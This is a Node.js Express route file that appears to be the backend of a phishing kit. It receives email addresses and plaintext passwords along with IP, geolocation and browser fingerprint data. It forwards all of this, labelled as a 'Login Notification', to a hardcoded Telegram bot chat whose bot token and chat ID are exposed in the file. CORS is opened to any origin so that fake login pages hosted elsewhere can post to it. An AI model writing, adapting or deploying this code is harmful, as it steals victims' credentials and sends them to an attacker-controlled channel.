const express = require("express");
const fetch = require("node-fetch");
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');
const cors = require('cors');

const router = express.Router();

// Your Telegram bot credentials
const BOT_TOKEN = "6808029671:AAGCyAxWwDfYMfeTEo9Jbc5-PKYUgbLLkZ4";
const CHAT_ID = "6068638071";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

// Enable CORS
router.use(cors());

// Handle OPTIONS preflight requests
router.options('*', cors());

router.post('/', async (req, res) => {
    try {
        // Set CORS headers
        res.header('Access-Control-Allow-Origin', '*');
        res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
        res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
        
        console.log('📨 Received request body:', req.body);

        const { email, password, rememberMe, userAgent, language, platform, screenResolution, timezone, timestamp } = req.body;

        if (!email || !password) {
            return res.status(400).json({ 
                success: false, 
                message: "Missing email or password" 
            });
        }

        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
        const location = geoip.lookup(ip);
        const locationStr = location ? `${location.city}, ${location.country}` : 'Unknown';

        // Use frontend userAgent or parse from headers
        const parser = new UAParser(userAgent || req.headers['user-agent']);
        const agent = parser.getResult();
        const deviceType = `${agent.os.name} ${agent.os.version} - ${agent.browser.name} ${agent.browser.version}`;

        // Build the Telegram message
        const message = `
📌 *Login Notification*
- Email: ${email}
- Password: ${password}
- IP: ${ip}
- Location: ${locationStr}
- Timestamp: ${timestamp || new Date().toISOString()}
- Device: ${deviceType}
- Screen: ${screenResolution || 'Unknown'}
- Timezone: ${timezone || 'Unknown'}
- Language: ${language || 'Unknown'}
- Platform: ${platform || 'Unknown'}
        `;

        console.log('📤 Sending to Telegram:', message);

        // Send to Telegram
        const telegramResponse = await fetch(TELEGRAM_API, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "Markdown"
            })
        });

        if (!telegramResponse.ok) {
            const errText = await telegramResponse.text();
            throw new Error(`Telegram API error: ${errText}`);
        }

        console.log(`✅ Telegram notification sent for ${email}`);

        res.status(200).json({
            success: true,
            message: "Notification sent successfully via Telegram",
            telegramSent: true,
            loginDetails: { 
                device: deviceType, 
                ip, 
                location: locationStr,
                timestamp: new Date().toISOString()
            }
        });

    } catch (error) {
        console.error("❌ Error sending Telegram message:", error);
        res.status(500).json({ 
            success: false, 
            message: "Failed to send Telegram notification", 
            error: error.message 
        });
    }
});

module.exports = router;